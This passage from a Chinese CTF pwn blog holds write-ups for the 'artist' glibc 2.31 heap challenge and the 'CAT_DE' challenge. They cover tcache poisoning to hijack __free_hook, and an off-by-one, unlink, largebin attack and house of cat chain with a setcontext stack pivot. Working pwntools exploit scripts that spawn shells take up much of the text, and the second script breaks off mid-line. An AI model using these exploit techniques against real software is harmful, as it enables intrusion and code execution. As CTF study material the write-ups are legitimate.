distance 0x7f9884202290 0x7f9884234420</span></span><br><span class="line"><span class="string">0x7f9884202290-&gt;0x7f9884234420 is 0x32190 bytes (0x6432 words)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="artist"><a href="#artist" class="headerlink" title="artist"></a>artist</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">9742f</span>e0f588e66c62439c18f22559cc96a5137df, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *data; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  data = *(<span class="keyword">char</span> **)buf;</span><br><span class="line">  writen(<span class="string">&quot;Madness is the reason for becoming a king.\n&quot;</span>);</span><br><span class="line">  data[readn()] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>任意堆地址置空</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>具体的思路就是利用任意堆地址置空来覆盖 tcache-&gt;next 指针，从而完成堆重叠</p>
<p>堆重叠以后就可以修改 chunk-&gt;size 来伪造 unsorted chunk，将其释放后就可以泄露 libc_base</p>
<p>利用堆风水即可第二次覆盖 tcache-&gt;next 为 free_hook，即可劫持程序执行流</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data</span>):</span> <span class="comment"># 0x80</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">&quot;input some&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit1</span>(<span class="params">index,data</span>):</span> <span class="comment">#1</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;crazy\n&quot;</span>,<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;inspiration.\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sa(<span class="string">&quot;crazy\n&quot;</span>,<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;king.\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;inspiration.\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit3</span>(<span class="params">data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;crazy\n&quot;</span>,<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;inspiration.\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free1</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;edits?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sa(<span class="string">&quot;content\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;edits?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">sa(<span class="string">&quot; other.&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    free2(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit1(<span class="number">10</span>,<span class="string">&quot;\x50&quot;</span>)</span><br><span class="line">edit2(<span class="number">0</span>,<span class="string">&quot;\xa0&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x481</span>)</span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line">free2(<span class="number">1</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">free2(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please enjoy your masterpiece.\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecb31</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free2(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please enjoy your masterpiece.\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x4a0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">edit3(p64(free_hook))</span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(p64(system))</span><br><span class="line"></span><br><span class="line">free2(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/11/CAT_DE%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/11/CAT_DE%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">CAT_DE出题思路</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-11 19:40:49 / Modified: 19:45:37" itemprop="dateCreated datePublished" datetime="2023-06-11T19:40:49+08:00">2023-06-11</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-Challenge/" itemprop="url" rel="index"><span itemprop="name">CTF Challenge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>CAT_DE</strong></p>
<p>原本是想考察无泄露 off-by-one + houseofcat 的，但考虑到比赛时长还是对题目进行了修改，原本的设计会记录输入的数据大小，然后在 write 时限制输出的大小，而现在改为 0x30 了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">	output(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">	index = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)input_num();</span><br><span class="line">	<span class="keyword">if</span> (index &lt;= <span class="number">0xF</span> &amp;&amp; chunk_list[index])</span><br><span class="line">	&#123;</span><br><span class="line">		output(<span class="string">&quot;context:\n&quot;</span>);</span><br><span class="line">		write(<span class="number">1</span>, chunk_list[index], <span class="number">0x30</span>uLL);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		output(<span class="string">&quot;wrong!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 write 没有了限制，就可以直接打印遗留的 heap 地址</li>
</ul>
<p>本 wp 还是使用的无泄露 off-by-one + houseofcat 的方式来解题，对于没有 heap_base 的 unlink 攻击可以用如下思路进行绕过：</p>
<ul>
<li>获取两个 unsorted chunk 进行合并，其中的第二个 chunk 末地址必须为 <code>\x00</code>（遗留下 FD BK 指针）</li>
<li>重新申请大 unsorted chunk 后释放（不破坏原来的 heap 结构），然后再次进行分割，使第二个 chunk 的末尾地址为 <code>\x30</code> 或者 <code>\x40</code> <code>\x50</code> 等等（有一定偏移的地址都可以）</li>
<li>之后利用 unsortedbin 进行调整，在 FD-&gt;bk 和 BK-&gt;fd 中写入 <code>\x30</code>，然后覆盖为 <code>\x00</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55b6302fbd00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55b6302fbd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55b6302fbd08</span> ◂— <span class="number">0x441</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55b6302fbd10</span> —▸ <span class="number">0x55b6302fb290</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55b6302fbd18</span> —▸ <span class="number">0x55b6302fc350</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>完成 unlink 攻击后有一次 largebin attack 的机会，劫持 <code>stderr</code> 伪造 FILE 结构体，后面的利用就和 house of cat 一样了</p>
<p>house of cat 调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__fxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt;  _IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa0ae8d1838</span> &lt;_IO_wfile_seekoff+<span class="number">104</span>&gt;    call   _IO_switch_to_wget_mode                &lt;_IO_switch_to_wget_mode&gt;</span><br><span class="line">       rdi: <span class="number">0x5618e47bbb00</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x7fa0aea2a208</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x5618e47bbbb0</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在这里会 <code>call [rax+0x18]</code> 而 <code>rax</code> 是我们可以控制的（就是 <code>FILE-&gt;_IO_buf_end</code>，是我们人为伪造的）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x5620ac902b40</span> ◂— <span class="number">0xffff</span></span><br><span class="line">*RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line"> RDX  <span class="number">0x5620ac902bb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x7f6ef7dc9d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>把这里修改为 <code>setcontext+61</code> 进行栈迁移（<code>rdx</code> 也是可以控制的）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5620ac902b40</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5620ac902b58</span> —▸ <span class="number">0x7f6ef7d99a6d</span> (setcontext+<span class="number">61</span>) ◂— mov    rsp, qword ptr [rdx + <span class="number">0xa0</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5620ac902b60</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5620ac902b88</span> —▸ <span class="number">0x5620ac902200</span> ◂— <span class="number">0x200000001</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5620ac902b90</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后利用 House Of Kiwi 中的方式 get shell</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./CAT_DE1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : 